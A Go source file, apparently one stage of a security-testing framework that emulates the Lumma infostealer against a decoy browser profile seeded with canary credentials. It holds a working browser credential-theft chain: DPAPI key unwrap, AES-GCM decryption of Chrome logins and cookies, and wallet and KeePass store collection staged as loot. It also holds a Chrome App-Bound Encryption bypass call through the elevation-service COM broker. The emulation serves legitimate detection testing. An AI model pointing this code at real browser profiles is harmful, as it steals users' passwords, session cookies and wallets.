// Stage 3 — T1555.003 / T1555 Credentials from Web Browsers (Password Stores)
// F0RT1KA Security Testing Framework — Lumma-style infostealer emulation
//
// LummaC2 harvests browser-stored credentials, cookies, wallet and 2FA
// extension data (NCC Group: Login Data + Web Data of Chrome/Edge; malpedia:
// wallets + 2FA extensions first). This stage runs the FULL real crypto chain
// against a SYNTHETIC decoy browser profile, plus two user-approved real-host
// telemetry touches:
//
//   A. RECON (read-only): if a REAL Chrome/Edge Local State exists, the file
//      is read once, its key-material FIELDS are logged as metadata only
//      (sizes, DPAPI/APPB prefix presence) and the bytes are DISCARDED.
//      The real key is NEVER unwrapped, copied, or transmitted — the spec's
//      refuse line (reading/exfiltrating real secrets) stays enforced.
//      [approved realism lift 2026-11-02]
//
//   B. DECOY THEFT CHAIN (the technique core):
//      1. decoy Chromium profile in ARTIFACT_DIR\lumma_profile with real
//         file names (Login Data, Local State, Network\Cookies, Web Data,
//         Gecko logins.json + key4.db, KeePass.kdbx, wallet/2FA extension
//         dirs) and CANARY credentials (SSA-reserved SSN range, 4242 test-BIN
//         PAN, .example.test/.invalid identifiers, run-unique marker).
//      2. steal sequence exactly as the stealer does it: copy the locked DBs
//         to a scratch dir (Chromium lock workaround; %TEMP% substituted with
//         the staging dir per the F0RT1KA write-gate), parse Local State →
//         os_crypt.encrypted_key → strip "DPAPI" → CryptUnprotectData →
//         AES-256 key, then SELECT logins/cookies from the SQLite DBs and
//         decrypt the v10 AES-GCM blobs. Canary round-trip verified.
//      3. wholesale collection of stores the real stealer exfiltrates whole:
//         KeePass DB, Gecko key4.db/logins.json, wallet + 2FA extension dirs
//         → copied to ARTIFACT_DIR\lumma_staging\loot for Stage 4.
//
//   C. ABE ATTEMPT (App-Bound Encryption bypass primitive) [approved realism
//      lift 2026-11-02]: CoCreateInstance on the real Chrome elevation-service
//      CLSID {708860E0-...} / IID {463ABECF-...} with CoSetProxyBlanket
//      (dynamic cloaking), then an IElevator::DecryptData (vtable slot 5)
//      call carrying a SYNTHETIC APPB-prefixed blob — never the real key.
//      Edge's elevator is ACTIVATED (CoCreateInstance + QueryInterface) but
//      its divergent vtable layout is NOT invoked (calling an unverified slot
//      on a production broker is unsafe). COM failures (including
//      REGDB_E_CLASSNOTREG when Chrome is absent) are telemetry, never a
//      block classification.
//
// EXIT CODES: 0 = canary credentials decrypted + loot staged; 126 reserved
// for positive prevention evidence (none expected in this stage — every
// denial here is environmental); 999 = decoy/DPAPI/SQLite failure.

//go:build windows
// +build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	_ "modernc.org/sqlite"
)

const (
	TEST_UUID      = "26a8b54e-b51c-489d-beae-295e1eecc524"
	TECHNIQUE_ID   = "T1555.003"
	TECHNIQUE_NAME = "Credentials from Web Browsers: Chromium DPAPI/AES-GCM Chain, Gecko/KeePass/Wallet/2FA Stores (T1555.003 / T1555)"
	STAGE_ID       = 3
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

const (
	profileRoot = "lumma_profile"
	lootRel     = "lumma_staging" // loot staged at ARTIFACT_DIR\lumma_staging\loot
	scratchRoot = "lumma_scratch"

	// MetaMask Chrome extension id (public, well-known).
	walletExtID = "nkbihfbeogaeaoehlefnkodbefgpgknn"
	// Synthetic stand-in directory for 2FA/authenticator extension storage.
	twoFAExtID = "synthetic-2fa-authenticator"
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)

	exitCode := performTechnique()

	switch exitCode {
	case StageSuccess:
		fmt.Printf("[STAGE %s] Credential theft chain completed - canaries decrypted, loot staged\n", TECHNIQUE_ID)
		LogMessage("SUCCESS", TECHNIQUE_ID, "Decoy browser credentials decrypted via real DPAPI+AES-GCM chain; stores collected")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Browser credential theft chain executed without prevention")
	case StageBlocked:
		fmt.Printf("[STAGE %s] Credential theft prevented (positive evidence)\n", TECHNIQUE_ID)
		LogMessage("BLOCKED", TECHNIQUE_ID, "Credential theft stopped with positive prevention evidence")
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Credential theft prevented (positive evidence)")
	default:
		fmt.Printf("[STAGE %s] Stage error - inconclusive\n", TECHNIQUE_ID)
		LogMessage("ERROR", TECHNIQUE_ID, "Credential theft stage inconclusive or prerequisite failure")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Stage error or inconclusive")
	}
	os.Exit(exitCode)
}

func performTechnique() int {
	runMarker := randomHex(8)

	// ------------------------------------------------------------------
	// A. Real-store recon (read-only, metadata-only) — approved lift.
	// ------------------------------------------------------------------
	reconRealLocalState("Google", "Chrome")
	reconRealLocalState("Microsoft", "Edge")

	// ------------------------------------------------------------------
	// B1. Build the decoy browser profile with canary credentials.
	// ------------------------------------------------------------------
	profileDir := filepath.Join(ARTIFACT_DIR, profileRoot)
	lootDir := filepath.Join(ARTIFACT_DIR, lootRel, "loot")
	scratchDir := filepath.Join(ARTIFACT_DIR, scratchRoot)
	for _, d := range []string{profileDir, lootDir, scratchDir} {
		if err := os.MkdirAll(d, 0755); err != nil {
			LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to create %s: %v", d, err))
			return StageError
		}
	}
	defer func() {
		// Loot stays for Stage 4 (which cleans up after exfil); decoys and
		// scratch copies are removed here once harvesting is done.
		if err := os.RemoveAll(profileDir); err != nil {
			LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("cleanup: profile dir: %v", err))
		}
		if err := os.RemoveAll(scratchDir); err != nil {
			LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("cleanup: scratch dir: %v", err))
		}
	}()

	aesKey := make([]byte, 32)
	if _, err := rand.Read(aesKey); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("key generation failed: %v", err))
		return StageError
	}

	canaries := buildCanaries(runMarker)
	if err := buildDecoyProfile(profileDir, aesKey, canaries, runMarker); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("decoy profile build failed: %v", err))
		return StageError
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Decoy Chromium/Gecko/KeePass profile built with %d canary logins", len(canaries)))

	// ------------------------------------------------------------------
	// B2. The theft chain — copy locked DBs, unwrap key, decrypt v10 blobs.
	// ------------------------------------------------------------------
	userData := filepath.Join(profileDir, "ChromeProfile", "User Data")
	defaultProfile := filepath.Join(userData, "Default")

	// Stealer lock workaround: copy DBs before opening (temp dir substituted).
	loginCopy := filepath.Join(scratchDir, "Login Data")
	cookiesCopy := filepath.Join(scratchDir, "Cookies")
	for src, dst := range map[string]string{
		filepath.Join(defaultProfile, "Login Data"):       loginCopy,
		filepath.Join(defaultProfile, "Network", "Cookies"): cookiesCopy,
	} {
		if err := copyFile(src, dst); err != nil {
			LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("DB copy %s: %v", src, err))
			return StageError
		}
	}
	LogMessage("INFO", TECHNIQUE_ID, "Copied locked SQLite stores to scratch (stealer lock workaround)")

	// Local State → encrypted_key → DPAPI unwrap.
	key, err := unwrapDecoyKey(filepath.Join(userData, "Local State"))
	if err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Local State key unwrap failed: %v", err))
		return StageError
	}
	LogMessage("INFO", TECHNIQUE_ID, "CryptUnprotectData(encrypted_key) succeeded - AES-256 master key recovered (32 bytes)")

	decryptedLogins, derr := decryptLoginData(loginCopy, key)
	if derr != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Login Data decrypt failed: %v", derr))
		return StageError
	}
	verified := 0
	for _, c := range decryptedLogins {
		if strings.Contains(c.Password, "F0RT1KA-CANARY") {
			verified++
		}
	}
	if verified == 0 {
		LogMessage("ERROR", TECHNIQUE_ID, "no canary marker verified after decrypt - crypto chain inconclusive")
		return StageError
	}

	decryptedCookies, cerr := decryptCookies(cookiesCopy, key)
	if cerr != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Cookies decrypt failed: %v", cerr))
		return StageError
	}
	LogMessage("CRITICAL", TECHNIQUE_ID, fmt.Sprintf("Decrypted %d logins (%d canaries verified) and %d cookies from decoy stores", len(decryptedLogins), verified, len(decryptedCookies)))

	// ------------------------------------------------------------------
	// B3. Wholesale collection of remaining stores → loot staging.
	// ----------------------------------------------------------------++
	if err := collectWholesale(profileDir, lootDir, decryptedLogins, runMarker); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("wholesale collection failed: %v", err))
		return StageError
	}

	// ------------------------------------------------------------------
	// C. ABE COM elevation attempt (synthetic blob, real broker).
	// ------------------------------------------------------------------
	attemptABEBypass()

	LogMessage("CRITICAL", TECHNIQUE_ID, "Browser credential theft chain complete - loot staged for exfiltration")
	return StageSuccess
}

// ============================================================================
// Canary credential set (SSA-reserved SSN range, test-BIN PAN, reserved
// domains, run-unique marker — Kothamine-style decoys).
// ============================================================================

type canaryLogin struct {
	Origin   string
	Username string
	Password string
}

func buildCanaries(marker string) []canaryLogin {
	return []canaryLogin{
		{Origin: "https://portal.synthetic-bank-01.example.test/login", Username: "corporate.treasury@example.test", Password: "F0RT1KA-CANARY-" + marker + "-01"},
		{Origin: "https://mail.example.test/", Username: "billing-ops@synthetic.invalid", Password: "F0RT1KA-CANARY-" + marker + "-02"},
		{Origin: "https://cardportal.example.test/auth", Username: "4242-4242-4242-4242", Password: "F0RT1KA-CANARY-" + marker + "-03"},
		{Origin: "https://hr.synthetic-holding.example.test/sso", Username: "employee.900-89-9999@example.test", Password: "F0RT1KA-CANARY-" + marker + "-04"},
		{Origin: "https://vpn.example.test/connect", Username: "svc-backup@synthetic.invalid", Password: "F0RT1KA-CANARY-" + marker + "-05"},
	}
}

// ============================================================================
// Decoy profile construction.
// ============================================================================

func buildDecoyProfile(root string, aesKey []byte, canaries []canaryLogin, marker string) error {
	userData := filepath.Join(root, "ChromeProfile", "User Data")
	def := filepath.Join(userData, "Default")
	for _, d := range []string{
		filepath.Join(def, "Network"),
		filepath.Join(def, "Local Storage", "leveldb"),
		filepath.Join(def, "Local Extension Settings", walletExtID),
		filepath.Join(def, "Local Extension Settings", twoFAExtID),
		filepath.Join(root, "GeckoProfile", "Profiles", "x7f9k2al.default-release"),
		filepath.Join(root, "KeePass"),
	} {
		if err := os.MkdirAll(d, 0755); err != nil {
			return err
		}
	}

	// ---- Local State: DPAPI-wrapped AES key (v10 user-scope form) + an
	// APPB-prefixed stand-in blob for the v20 app-bound field. ----
	wrapped, err := cryptProtect(aesKey)
	if err != nil {
		return fmt.Errorf("DPAPI wrap of decoy key: %v", err)
	}
	encKey := base64.StdEncoding.EncodeToString(append([]byte("DPAPI"), wrapped...))
	appb := base64.StdEncoding.EncodeToString(append([]byte("APPB"), wrapped...))
	localState := map[string]interface{}{
		"os_crypt": map[string]string{
			"encrypted_key":           encKey,
			"app_bound_encrypted_key": appb,
		},
	}
	lsBytes, _ := json.Marshal(localState)
	if err := os.WriteFile(filepath.Join(userData, "Local State"), lsBytes, 0644); err != nil {
		return err
	}
	LogFileDropped("Local State", filepath.Join(userData, "Local State"), int64(len(lsBytes)), false)

	// ---- Login Data (real SQLite, real schema subset, v10 blobs). ----
	if err := buildLoginDataDB(filepath.Join(def, "Login Data"), aesKey, canaries); err != nil {
		return fmt.Errorf("Login Data: %v", err)
	}

	// ---- Cookies (SQLite; encrypted_value same v10 scheme). ----
	cookieDB := filepath.Join(def, "Network", "Cookies")
	db, err := sql.Open("sqlite", cookieDB)
	if err != nil {
		return err
	}
	if _, err := db.Exec(`CREATE TABLE cookies(
		creation_utc INTEGER NOT NULL, host_key TEXT NOT NULL, name TEXT NOT NULL,
		value TEXT NOT NULL DEFAULT '', path TEXT NOT NULL DEFAULT '/',
		expires_utc INTEGER NOT NULL, is_secure INTEGER NOT NULL, is_httponly INTEGER NOT NULL,
		encrypted_value BLOB DEFAULT NULL)`); err != nil {
		db.Close()
		return err
	}
	for i, host := range []string{"portal.synthetic-bank-01.example.test", "mail.example.test", "sso.example.test"} {
		blob, aerr := encryptV10(aesKey, fmt.Sprintf("F0RT1KA-CANARY-COOKIE-%s-%02d", marker, i))
		if aerr != nil {
			db.Close()
			return aerr
		}
		if _, err := db.Exec(`INSERT INTO cookies(creation_utc, host_key, name, expires_utc, is_secure, is_httponly, encrypted_value)
			VALUES (?,?,?,?,?,?,?)`, int64(13300000000000000+i), host, "session_token", int64(13310000000000000), 1, 1, blob); err != nil {
			db.Close()
			return err
		}
	}
	db.Close()

	// ---- Web Data (autofill canaries incl. SSA-reserved SSN). ----
	webDB, err := sql.Open("sqlite", filepath.Join(def, "Web Data"))
	if err != nil {
		return err
	}
	if _, err := webDB.Exec(`CREATE TABLE autofill(name TEXT, value TEXT, date_created INTEGER, count INTEGER)`); err == nil {
		_, _ = webDB.Exec(`INSERT INTO autofill(name, value, date_created, count) VALUES (?,?,?,1)`, "national-id", "900-89-9999", 13300000000000000)
		_, _ = webDB.Exec(`INSERT INTO autofill(name, value, date_created, count) VALUES (?,?,?,1)`, "card-number", "4242-4242-4242-4242", 13300000000000001)
	}
	webDB.Close()

	// ---- leveldb / extension markers (bytes only — the stealer copies dirs). ----
	lvl := append([]byte("F0RT1KA SYNTHETIC LEVELDB LOG "+marker+"\x00\x01\x02"), make([]byte, 512)...)
	for _, p := range []string{
		filepath.Join(def, "Local Storage", "leveldb", "000003.log"),
		filepath.Join(def, "Local Extension Settings", walletExtID, "000003.log"),
		filepath.Join(def, "Local Extension Settings", twoFAExtID, "000003.log"),
	} {
		if err := os.WriteFile(p, lvl, 0644); err != nil {
			return err
		}
	}

	// ---- Gecko: logins.json + key4.db (minimal real SQLite). ----
	geckoProfile := filepath.Join(root, "GeckoProfile", "Profiles", "x7f9k2al.default-release")
	loginsJSON := fmt.Sprintf(`{"nextId":%d,"logins":[{"id":1,"hostname":"https://portal.synthetic-bank-01.example.test","encryptedUsername":"F0RT1KA-CANARY-GECKO-U-%s","encryptedPassword":"F0RT1KA-CANARY-GECKO-P-%s"}]}`,
		2, marker, marker)
	if err := os.WriteFile(filepath.Join(geckoProfile, "logins.json"), []byte(loginsJSON), 0644); err != nil {
		return err
	}
	key4, err := sql.Open("sqlite", filepath.Join(geckoProfile, "key4.db"))
	if err != nil {
		return err
	}
	if _, err := key4.Exec(`CREATE TABLE metaData(id INTEGER PRIMARY KEY, item TEXT, value TEXT)`); err == nil {
		_, _ = key4.Exec(`INSERT INTO metaData(item, value) VALUES ('password','F0RT1KA-CANARY-GECKO-MASTER-'+?)`, marker)
	}
	key4.Close()

	// ---- KeePass kdbx (real magic + synthetic bytes). ----
	kdbx := append([]byte{0x03, 0xD9, 0xA2, 0x9A, 0x67, 0xFB, 0x4B, 0xB5},
		[]byte("F0RT1KA-SYNTHETIC-KEEPASS-DB-"+marker)...)
	kdbx = append(kdbx, make([]byte, 2048)...)
	if err := os.WriteFile(filepath.Join(root, "KeePass", "KeePass.kdbx"), kdbx, 0644); err != nil {
		return err
	}
	LogFileDropped("KeePass.kdbx", filepath.Join(root, "KeePass", "KeePass.kdbx"), int64(len(kdbx)), false)
	return nil
}

func buildLoginDataDB(path string, aesKey []byte, canaries []canaryLogin) error {
	db, err := sql.Open("sqlite", path)
	if err != nil {
		return err
	}
	defer db.Close()
	if _, err := db.Exec(`CREATE TABLE logins(
		id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
		origin_url VARCHAR NOT NULL,
		action_url VARCHAR,
		username_element VARCHAR,
		username_value VARCHAR,
		password_element VARCHAR,
		password_value BLOB,
		date_created INTEGER NOT NULL,
		blacklisted_by_user INTEGER NOT NULL DEFAULT 0)`); err != nil {
		return err
	}
	for i, c := range canaries {
		blob, aerr := encryptV10(aesKey, c.Password)
		if aerr != nil {
			return aerr
		}
		if _, err := db.Exec(`INSERT INTO logins(origin_url, action_url, username_element, username_value, password_element, password_value, date_created)
			VALUES (?,?,?,?,?,?,?)`,
			c.Origin, c.Origin+"/submit", "username", c.Username, "password", blob, int64(13200000000000000+i)); err != nil {
			return err
		}
	}
	LogFileDropped("Login Data", path, 4096, false)
	return nil
}

// ============================================================================
// Theft chain primitives.
// ============================================================================

func unwrapDecoyKey(localStatePath string) ([]byte, error) {
	raw, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("reading Local State: %v", err)
	}
	var ls struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(raw, &ls); err != nil {
		return nil, fmt.Errorf("parsing Local State: %v", err)
	}
	if ls.OsCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("encrypted_key field absent")
	}
	blob, err := base64.StdEncoding.DecodeString(ls.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("decoding encrypted_key: %v", err)
	}
	if !strings.HasPrefix(string(blob), "DPAPI") {
		return nil, fmt.Errorf("expected DPAPI prefix")
	}
	key, err := cryptUnprotect(blob[len("DPAPI"):])
	if err != nil {
		return nil, fmt.Errorf("CryptUnprotectData: %v", err)
	}
	if len(key) != 32 {
		return nil, fmt.Errorf("unwrapped key is %d bytes, want 32", len(key))
	}
	return key, nil
}

func decryptLoginData(dbPath string, key []byte) ([]canaryLogin, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []canaryLogin
	for rows.Next() {
		var c canaryLogin
		var blob []byte
		if err := rows.Scan(&c.Origin, &c.Username, &blob); err != nil {
			return nil, err
		}
		pw, perr := decryptV10(key, blob)
		if perr != nil {
			LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("v10 decrypt of one login returned: %v", perr))
			continue
		}
		c.Password = pw
		out = append(out, c)
	}
	return out, rows.Err()
}

func decryptCookies(dbPath string, key []byte) ([]string, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	rows, err := db.Query(`SELECT host_key, name, encrypted_value FROM cookies`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []string
	for rows.Next() {
		var host, name string
		var blob []byte
		if err := rows.Scan(&host, &name, &blob); err != nil {
			return nil, err
		}
		val, verr := decryptV10(key, blob)
		if verr != nil {
			continue
		}
		out = append(out, fmt.Sprintf("%s/%s=%s", host, name, val))
	}
	return out, rows.Err()
}

// encryptV10 builds Chromium os_crypt blobs: "v10"+nonce(12)+ct+tag(16).
func encryptV10(key []byte, plaintext string) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(append([]byte("v10"), nonce...), nonce, []byte(plaintext), nil), nil
}

func decryptV10(key []byte, blob []byte) (string, error) {
	if len(blob) < 3+12+16 || string(blob[:3]) != "v10" {
		return "", fmt.Errorf("not a v10 blob (%d bytes)", len(blob))
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := blob[3 : 3+12]
	ct := blob[3+12:]
	pt, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return "", fmt.Errorf("AES-GCM open failed: %v", err)
	}
	return string(pt), nil
}

// collectWholesale copies the stores real stealers exfiltrate whole and
// writes the harvested-credentials manifest into the loot dir.
func collectWholesale(profileDir, lootDir string, logins []canaryLogin, marker string) error {
	pairs := []struct{ src, dst string }{
		{filepath.Join(profileDir, "KeePass", "KeePass.kdbx"), filepath.Join(lootDir, "KeePass.kdbx")},
		{filepath.Join(profileDir, "GeckoProfile", "Profiles", "x7f9k2al.default-release", "logins.json"), filepath.Join(lootDir, "logins.json")},
		{filepath.Join(profileDir, "GeckoProfile", "Profiles", "x7f9k2al.default-release", "key4.db"), filepath.Join(lootDir, "key4.db")},
	}
	for _, p := range pairs {
		if err := copyFile(p.src, p.dst); err != nil {
			return fmt.Errorf("collect %s: %v", p.src, err)
		}
	}
	copyDir(filepath.Join(profileDir, "ChromeProfile", "User Data", "Default", "Local Extension Settings", walletExtID),
		filepath.Join(lootDir, "wallet_"+walletExtID))
	copyDir(filepath.Join(profileDir, "ChromeProfile", "User Data", "Default", "Local Extension Settings", twoFAExtID),
		filepath.Join(lootDir, "twofa_"+twoFAExtID))

	manifest := map[string]interface{}{
		"run_marker":     marker,
		"note":           "F0RT1KA SYNTHETIC HARVEST - all values are canaries",
		"decrypted":      logins,
		"collected_dirs": []string{"wallet_" + walletExtID, "twofa_" + twoFAExtID},
	}
	raw, _ := json.MarshalIndent(manifest, "", "  ")
	if err := os.WriteFile(filepath.Join(lootDir, "credentials.json"), raw, 0644); err != nil {
		return err
	}
	LogFileDropped("credentials.json", filepath.Join(lootDir, "credentials.json"), int64(len(raw)), false)
	return nil
}

func reconRealLocalState(vendor, browser string) {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return
	}
	p := filepath.Join(localAppData, vendor, browser, "User Data", "Local State")
	info, err := os.Stat(p)
	if err != nil {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("recon: no real %s Local State present (benign)", browser))
		return
	}
	raw, rerr := os.ReadFile(p)
	if rerr != nil {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("recon: real %s Local State present (%d bytes) but not readable in this context (benign)", browser, info.Size()))
		return
	}
	var ls struct {
		OsCrypt struct {
			EncryptedKey      string `json:"encrypted_key"`
			AppBoundEncrypted string `json:"app_bound_encrypted_key"`
		} `json:"os_crypt"`
	}
	_ = json.Unmarshal(raw, &ls)
	report := func(field, v string) {
		if v == "" {
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("recon: real %s Local State: %s absent", browser, field))
			return
		}
		if blob, derr := base64.StdEncoding.DecodeString(v); derr == nil {
			prefix := ""
			if len(blob) >= 4 {
				prefix = string(blob[:4])
			}
			// Metadata ONLY — bytes discarded, key never unwrapped/staged.
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("recon: real %s Local State: %s present, %d wrapped bytes, prefix %q (contents discarded, never unwrapped)", browser, field, len(blob), prefix))
		}
	}
	report("os_crypt.encrypted_key", ls.OsCrypt.EncryptedKey)
	report("os_crypt.app_bound_encrypted_key", ls.OsCrypt.AppBoundEncrypted)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("recon: real %s Login Data existence probed (contents never read)", browser))
}

// ============================================================================
// ABE (App-Bound Encryption) COM attempt — synthetic blob, real broker.
// ============================================================================

var (
	ole32             = syscall.NewLazyDLL("ole32.dll")
	oleaut32          = syscall.NewLazyDLL("oleaut32.dll")
	procCoInitialize  = ole32.NewProc("CoInitializeEx")
	procCoUninit      = ole32.NewProc("CoUninitialize")
	procCoCreate      = ole32.NewProc("CoCreateInstance")
	procCoSetBlanket  = ole32.NewProc("CoSetProxyBlanket")
	procSysAllocByte  = oleaut32.NewProc("SysAllocStringByteLen")
	procSysFree       = oleaut32.NewProc("SysFreeString")
)

// CLSIDs/IIDs from public Chromium elevation-service research (xaitax
// Chrome-App-Bound-Encryption-Decryption; Chromium elevator.idl).
var (
	clsidElevatorChrome = syscall.GUID{Data1: 0x708860E0, Data2: 0xF641, Data3: 0x4611,
		Data4: [8]byte{0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}
	iidIElevatorChrome = syscall.GUID{Data1: 0x463ABECF, Data2: 0x410D, Data3: 0x407F,
		Data4: [8]byte{0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}
	clsidElevatorEdge = syscall.GUID{Data1: 0x1FCBE96C, Data2: 0x1697, Data3: 0x43AF,
		Data4: [8]byte{0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}
	iidIEdgeElevatorFinal = syscall.GUID{Data1: 0xC9C2B807, Data2: 0x7731, Data3: 0x4F34,
		Data4: [8]byte{0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}
)

const (
	clsctxLocalServer          = 0x4
	rpcAuthnDefault            = 0xFFFFFFFF
	rpcAuthnLevelPktPrivacy    = 0x6
	rpcImpLevelImpersonate     = 0x3
	eoacDynamicCloaking        = 0x40
	decryptDataVtableOffset    = 40 // slot 5: IUnknown(0-2), RunRecoveryCRXElevated(3), EncryptData(4), DecryptData(5)
)

func attemptABEBypass() {
	fmt.Printf("[STAGE %s] ABE attempt: activating Chrome elevation-service COM broker\n", TECHNIQUE_ID)

	// COM apartment affinity: pin to one OS thread for the whole section.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hr, _, _ := procCoInitialize.Call(0, 2 /*COINIT_APARTMENTTHREADED*/)
	if hr != 0 && hr != 1 { // S_FALSE(1) = already initialized on this thread
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("ABE: CoInitializeEx hr=0x%x (telemetry only)", int32(hr)))
		return
	}
	defer procCoUninit.Call()

	// Synthetic APPB blob — NEVER the real key material.
	synth := make([]byte, 32)
	_, _ = rand.Read(synth)
	wrapped, err := cryptProtect(synth)
	if err != nil {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("ABE: synthetic blob DPAPI wrap unavailable: %v (telemetry only)", err))
		return
	}
	blob := append([]byte("APPB"), wrapped...)

	abideChromeDecrypt(blob)
	abedgeActivationOnly()
}

// abideChromeDecrypt performs the full documented Chrome ABE primitive:
// CoCreateInstance → CoSetProxyBlanket(dynamic cloaking) → IElevator::
// DecryptData(slot 5) on the synthetic blob.
func abideChromeDecrypt(blob []byte) {
	var elevator unsafe.Pointer
	hr, _, _ := procCoCreate.Call(
		uintptr(unsafe.Pointer(&clsidElevatorChrome)), 0, clsctxLocalServer,
		uintptr(unsafe.Pointer(&iidIElevatorChrome)), uintptr(unsafe.Pointer(&elevator)))
	if hr != 0 {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("ABE Chrome: CoCreateInstance hr=0x%x (%s) - broker absent or COM refused (telemetry)", int32(hr), hresultName(int32(hr))))
		return
	}
	defer releaseCOM(elevator)
	LogMessage("CRITICAL", TECHNIQUE_ID, "ABE Chrome: elevation-service broker ACTIVATED via CoCreateInstance (real broker launch)")

	// CoSetProxyBlanket with dynamic cloaking (documented bypass requirement).
	_, _, _ = procCoSetBlanket.Call(uintptr(elevator),
		uintptr(rpcAuthnDefault), uintptr(rpcAuthnDefault), 0,
		uintptr(rpcAuthnLevelPktPrivacy), uintptr(rpcImpLevelImpersonate), 0, eoacDynamicCloaking)

	inBSTR, _, _ := procSysAllocByte.Call(uintptr(unsafe.Pointer(&blob[0])), uintptr(len(blob)))
	defer procSysFree.Call(inBSTR)
	var outBSTR uintptr
	var lastErr uint32

	// IElevator::DecryptData — vtable slot 5.
	vtbl := *(*uintptr)(elevator)
	fn := *(*uintptr)(unsafe.Pointer(vtbl + decryptDataVtableOffset))
	callHR, _, _ := syscall.SyscallN(fn, uintptr(elevator), inBSTR,
		uintptr(unsafe.Pointer(&outBSTR)), uintptr(unsafe.Pointer(&lastErr)))

	if callHR == 0 && outBSTR != 0 {
		// Broker executed DecryptData on our synthetic blob in its own
		// (elevated) context — the ABE primitive WORKED on this host.
		outLen := *(*uint32)(unsafe.Pointer(outBSTR - 4)) // BSTR length prefix
		LogMessage("CRITICAL", TECHNIQUE_ID, fmt.Sprintf("ABE Chrome: broker DecryptData returned SUCCESS on synthetic blob (out=%d bytes, lastErr=%d) - v20 primitive available", outLen, lastErr))
		procSysFree.Call(outBSTR)
	} else {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("ABE Chrome: DecryptData hr=0x%x lastErr=%d (synthetic user-scope blob refused - real attack passes system-wrapped v20 key; activation telemetry recorded)", int32(callHR), lastErr))
	}
}

// abedgeActivationOnly: Edge broker activation + QueryInterface telemetry.
// Edge's IEdgeElevatorFinal vtable layout diverges from Chrome's; no method
// beyond QueryInterface is invoked (calling an unverified slot on a
// production broker is unsafe).
func abedgeActivationOnly() {
	var elevator unsafe.Pointer
	hr, _, _ := procCoCreate.Call(
		uintptr(unsafe.Pointer(&clsidElevatorEdge)), 0, clsctxLocalServer,
		uintptr(unsafe.Pointer(&iidIEdgeElevatorFinal)), uintptr(unsafe.Pointer(&elevator)))
	if hr != 0 {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("ABE Edge: CoCreateInstance hr=0x%x (%s) - broker absent or COM refused (telemetry)", int32(hr), hresultName(int32(hr))))
		return
	}
	LogMessage("CRITICAL", TECHNIQUE_ID, "ABE Edge: elevation-service broker ACTIVATED via CoCreateInstance (QueryInterface negotiated; DecryptData not invoked - divergent vtable, see info card)")
	releaseCOM(elevator)
}

func releaseCOM(iface unsafe.Pointer) {
	if iface == nil {
		return
	}
	vtbl := *(*uintptr)(iface)
	fn := *(*uintptr)(unsafe.Pointer(vtbl + 2*8)) // IUnknown::Release
	syscall.SyscallN(fn, uintptr(iface))
}

